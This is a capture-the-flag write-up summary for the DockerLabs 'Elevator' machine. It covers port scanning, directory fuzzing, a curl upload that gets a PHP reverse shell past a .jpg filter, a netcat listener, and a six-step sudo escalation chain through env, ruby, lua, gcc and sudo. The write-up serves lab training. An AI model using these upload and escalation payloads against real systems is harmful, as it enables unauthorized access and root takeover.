---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, curl, netcat]
techniques: [information-gathering, directory-fuzzing, web-shell-upload, reverse-shells, sudo-abuse]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[bruteshock]]", "[[anonymous-pingu]]"]
---

# Elevator

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/elevator.md)

One port, no SSH, no passwords — a Scooby-Doo-themed site whose cast *is* `/etc/passwd`, an allow-list upload filter defeated by a client-side filename lie, and the vault's longest escalation: a **six-hop sudo chain**, one binary per floor (`env` → `ash` → `ruby` → `lua` → `gcc` → `sudo`).

## Path

1. **Recon** — `ping` + `nmap -p- --open -sS --min-rate 5000` → **only `80`** Apache 2.4.62 Debian, title *"El Ascensor Embrujado - Un Misterio de Scooby-Doo"*. No SSH means no brute-force anywhere in this box — everything after the foothold stays local ([[information-gathering]]).
2. **Dir fuzzing, twice** — pass 1 on `/`: `index.html` (200, 5647), `themes/` (301), `javascript/` (301), `server-status` (403), plus junk `# license, visit…` entries that are *the wordlist's own comment lines*, not findings ([[directory-fuzzing]]). Pass 2 **recursing into `themes/`** — where the whole attack surface was hiding: `uploads/` (301), **`upload.php` (200, size 0)**, `archivo.html` (200, 3380).
3. **Upload filter** — POST to `/themes/upload.php` answers *"Solo se permiten archivos con la extensión .jpg."* The filter reads the **declared** filename, so lie in it:

   ```sh
   curl -X POST -F "file=@php-pentestmonkey;filename=revshell.jpg" -F "submit=Upload File" \
     http://172.17.0.2/themes/upload.php
   # → El archivo ha sido subido correctamente: uploads/6ac67879e7091.jpg
   ```

   Body = PHP shell, name = `.jpg` — accepted, and the server **renames it to a random hash** (the response link is your only pointer to it) ([[web-shell-upload]]).
4. **RCE** — `curl http://172.17.0.2/themes/uploads/6ac67879e7091.jpg` **executes** the PHP — an allow-listed extension turned out to be a PHP handler on this server (never inspected — see gaps) — caught by `sudo nc -lvnp 443` → **`www-data`** ([[reverse-shells]]).
5. **User enum** — `cat /etc/passwd | grep /bin/sh` → `daphne` (1000), `vilma` (1001), `shaggy` (1002), `fred` (1003), `scooby` (1004) — the page's cast, five floors.

## The chain — six rules, six users

`sudo -l` after *every* hop; each account grants exactly one binary to the next:

| Hop | From → To | `sudo -l` rule | Payload |
|-----|-----------|----------------|---------|
| 1 | www-data → daphne | `(daphne) NOPASSWD: /usr/bin/env` | `sudo -u daphne /usr/bin/env /bin/bash` |
| 2 | daphne → vilma | `(vilma) NOPASSWD: /usr/bin/ash` | none needed — ash **is** a shell |
| 3 | vilma → shaggy | `(shaggy) NOPASSWD: /usr/bin/ruby` | `sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/bash"'` |
| 4 | shaggy → fred | `(fred) NOPASSWD: /usr/bin/lua` | `sudo -u fred /usr/bin/lua -e 'os.execute("/bin/bash")'` |
| 5 | fred → scooby | `(scooby) NOPASSWD: /usr/bin/gcc` | `sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s x` |
| 6 | scooby → root | `(root) NOPASSWD: /usr/bin/sudo` | `sudo -u root sudo su` |

`whoami` → **`root`** ([[sudo-abuse]], [[gtfobins]]).

## Takeaways

- **Recurse into every directory you find.** Pass 1 found only `themes/`; pass 2 on that one path found `upload.php` — the entire foothold — sitting at **200 with size 0**, an endpoint that renders nothing on GET and eats input on POST ([[directory-fuzzing]]).
- **The filename is a client-side opinion.** The allow-list checked what curl *declared* (`;filename=revshell.jpg`), not what the body *was*. And then the flip side of the usual phar lesson: **the allowed extension executed anyway** — "ask what the server runs, not what the filter allows" cuts both ways; here `.jpg` was already wired to PHP ([[web-shell-upload]]).
- **An elevator of interpreters.** Four of the six floors are scripting languages handed over by `sudo -l` — the whole escalation is *look up the binary on [[gtfobins]], paste the one-liner*, repeated six times. `sudo -l` after each hop is the rhythm, and every rule lived only on the account you just became ([[sudo-abuse]]).
- **`gcc -wrapper /bin/bash,-s x` is the payload to memorize.** A compiler in a sudo rule is a shell in a lab coat: `-wrapper` swaps gcc's driver for bash, and `-s x` gives it a file to swallow. Compilers, interpreters, *and* shells count — check all three sections of GTFOBins.
- **No SSH changes the shape of the box.** Single port → the foothold is HTTP-only, so there's no hydra, no credential replay — the chain is 100% local privilege abuse from `www-data` up.

## Gaps in the writeup

- **Why the `.jpg` executed is unrecorded.** No `apache2ctl -M`, no config read, no `file` on the uploaded blob — the misconfiguration that wires `.jpg` to the PHP handler *is* the vulnerability, and it's the one piece never on record (contrast the `.phar` boxes, where execution is default PHP behavior and needs no explaining).
- **`archivo.html` (200, 3380) was found and never fetched** — presumably the form's page (or the narrative), its content never appears anywhere in the writeup.
- **`javascript/` was fuzzed in, then abandoned** — a first-pass 301 that never got the recursion `themes/` got.
- **`uploads/` was never listed.** The form handed back one hash-named file; whether the directory is browsable — and what else lives in it — is untested.
- **No flags on record** — the chain ends at `whoami`, no `user.txt`/`root.txt`.
